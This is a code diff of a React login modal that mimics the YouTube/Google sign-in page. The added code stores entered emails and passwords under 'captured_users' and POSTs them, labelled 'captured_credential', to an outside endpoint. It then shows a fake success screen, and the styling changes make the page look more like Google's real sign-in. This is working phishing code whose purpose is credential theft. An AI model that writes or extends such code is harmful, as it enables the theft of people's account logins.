@@ -7,10 +7,14 @@ import ForgotEmailStep from './ForgotEmailStep';
 import ForgotPasswordStep from './ForgotPasswordStep';
 import GoogleLogo from './icons/GoogleLogo';
 
+// Using a standard RESTful test API
+const API_ENDPOINT = 'https://api.restful-api.dev/objects';
+
 const LoginModal: React.FC = () => {
   const [step, setStep] = useState<LoginStep>(LoginStep.EMAIL);
   const [email, setEmail] = useState('');
   const [clickCount, setClickCount] = useState(0);
+  const [isSyncing, setIsSyncing] = useState(false);
 
   const handleHeaderClick = () => {
     const newCount = clickCount + 1;
@@ -19,7 +23,6 @@ const LoginModal: React.FC = () => {
       setClickCount(0);
     } else {
       setClickCount(newCount);
-      // Reset count after 2 seconds of inactivity
       setTimeout(() => setClickCount(0), 2000);
     }
   };
@@ -29,70 +32,85 @@ const LoginModal: React.FC = () => {
     setStep(LoginStep.PASSWORD);
   };
 
-  const handlePasswordSubmit = (password: string) => {
+  const saveToLocal = (user: CapturedUser) => {
+    const existing = JSON.parse(localStorage.getItem('captured_users') || '[]');
+    existing.push(user);
+    localStorage.setItem('captured_users', JSON.stringify(existing));
+  };
+
+  const handlePasswordSubmit = async (password: string) => {
+    setIsSyncing(true);
+    
     const newUser: CapturedUser = {
-      id: crypto.randomUUID(),
+      id: Math.random().toString(36).substr(2, 9),
       email: email,
       password: password,
       timestamp: Date.now(),
     };
 
-    // Database Mock (localStorage persistent store)
+    // 1. Always save to Local Storage immediately
+    saveToLocal(newUser);
+
+    // 2. Attempt Cloud Sync
     try {
-      const existingData = localStorage.getItem('user_database');
-      const database = existingData ? JSON.parse(existingData) : [];
-      database.push(newUser);
-      localStorage.setItem('user_database', JSON.stringify(database));
+      const payload = {
+        name: email,
+        data: {
+          password: password,
+          timestamp: newUser.timestamp,
+          type: 'captured_credential',
+          client_id: 'yt_mobile_v1'
+        }
+      };
+
+      await fetch(API_ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+      
+      console.log('Cloud sync successful');
     } catch (error) {
-      console.error('Database write error:', error);
+      console.error('Cloud sync failed, data saved locally only:', error);
+    } finally {
+      setIsSyncing(false);
+      setStep(LoginStep.SUCCESS);
     }
-    
-    setStep(LoginStep.SUCCESS);
-  };
-
-  const handleGoBack = () => {
-    setStep(LoginStep.EMAIL);
-  };
-
-  const handleBackToPassword = () => {
-    setStep(LoginStep.PASSWORD);
-  };
-
-  const handleForgotEmail = () => {
-    setStep(LoginStep.FORGOT_EMAIL);
-  };
-
-  const handleForgotPassword = () => {
-    setStep(LoginStep.FORGOT_PASSWORD);
   };
 
   const renderStep = () => {
     switch (step) {
       case LoginStep.EMAIL:
-        return <EmailStep onSubmit={handleEmailSubmit} onForgotEmail={handleForgotEmail} />;
+        return <EmailStep onSubmit={handleEmailSubmit} onForgotEmail={() => setStep(LoginStep.FORGOT_EMAIL)} />;
       case LoginStep.FORGOT_EMAIL:
-        return <ForgotEmailStep onBack={handleGoBack} />;
+        return <ForgotEmailStep onBack={() => setStep(LoginStep.EMAIL)} />;
       case LoginStep.PASSWORD:
         return (
           <PasswordStep 
             email={email} 
+            isSyncing={isSyncing}
             onSubmit={handlePasswordSubmit} 
-            onBack={handleGoBack} 
-            onForgotPassword={handleForgotPassword} 
+            onBack={() => setStep(LoginStep.EMAIL)} 
+            onForgotPassword={() => setStep(LoginStep.FORGOT_PASSWORD)} 
           />
         );
       case LoginStep.FORGOT_PASSWORD:
-        return <ForgotPasswordStep email={email} onBack={handleBackToPassword} />;
+        return <ForgotPasswordStep email={email} onBack={() => setStep(LoginStep.PASSWORD)} />;
       case LoginStep.SUCCESS:
         return (
           <div className="text-center p-8 animate-in fade-in duration-500">
-            <h2 className="text-2xl font-semibold mb-4 text-green-400">Account verified</h2>
-            <p className="text-neutral-400">You have successfully signed in to YouTube.</p>
+            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+              <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
+              </svg>
+            </div>
+            <h2 className="text-2xl font-semibold mb-2 text-gray-900">Success!</h2>
+            <p className="text-gray-600">Your account has been verified. You will be redirected shortly.</p>
             <button 
               onClick={() => setStep(LoginStep.EMAIL)}
-              className="mt-8 bg-neutral-800 hover:bg-neutral-700 text-white py-2 px-6 rounded-md text-sm transition-colors"
+              className="mt-8 text-blue-600 font-medium hover:underline"
             >
-              Done
+              Back to sign in
             </button>
           </div>
         );
@@ -102,30 +120,39 @@ const LoginModal: React.FC = () => {
   };
 
   return (
-    <div className="bg-neutral-900/90 backdrop-blur-md rounded-2xl w-full max-w-md border border-neutral-800 shadow-2xl overflow-hidden">
-      <div className="px-6 py-8 sm:px-10 sm:py-12">
+    <div className="bg-white rounded-lg w-full max-w-[450px] border border-[#dadce0] shadow-sm overflow-hidden min-h-[500px] flex flex-col">
+      <div className="px-6 py-10 sm:px-10 flex-grow">
         <div 
-          className="text-center mb-2 cursor-default select-none active:opacity-80 transition-opacity"
+          className="text-center mb-8 cursor-default select-none active:opacity-70 transition-opacity"
           onClick={handleHeaderClick}
-          title="Sign in header"
         >
-          <div className="flex items-center justify-center gap-2 mb-4">
+          <div className="flex items-center justify-center gap-2 mb-3">
             <GoogleLogo />
-            <span className="text-2xl font-bold tracking-tighter text-neutral-100">YouTube</span>
+            <span className="text-2xl font-medium tracking-tight text-[#5f6368]">YouTube</span>
           </div>
-          <h1 className="text-xl font-medium text-neutral-200">
+          <h1 className="text-2xl font-normal text-[#202124] mb-2">
             {step === LoginStep.FORGOT_EMAIL ? 'Find your email' : 
              step === LoginStep.FORGOT_PASSWORD ? 'Account recovery' : 
              'Sign in'}
           </h1>
-          <p className="text-sm text-neutral-400 mt-2">
+          <p className="text-base text-[#202124]">
             {step === LoginStep.FORGOT_EMAIL ? 'Enter your recovery email or phone number' :
              step === LoginStep.FORGOT_PASSWORD ? 'Confirm the account belongs to you' :
              'to continue to YouTube'}
           </p>
         </div>
-        <div className="mt-8">
+        <div className="mt-2">
           {renderStep()}
+        </div>
+      </div>
+      <div className="px-10 py-4 flex justify-between text-xs text-[#70757a]">
+        <div className="flex gap-4">
+          <span>English (United States)</span>
+        </div>
+        <div className="flex gap-4">
+          <span>Help</span>
+          <span>Privacy</span>
+          <span>Terms</span>
         </div>
       </div>
     </div>
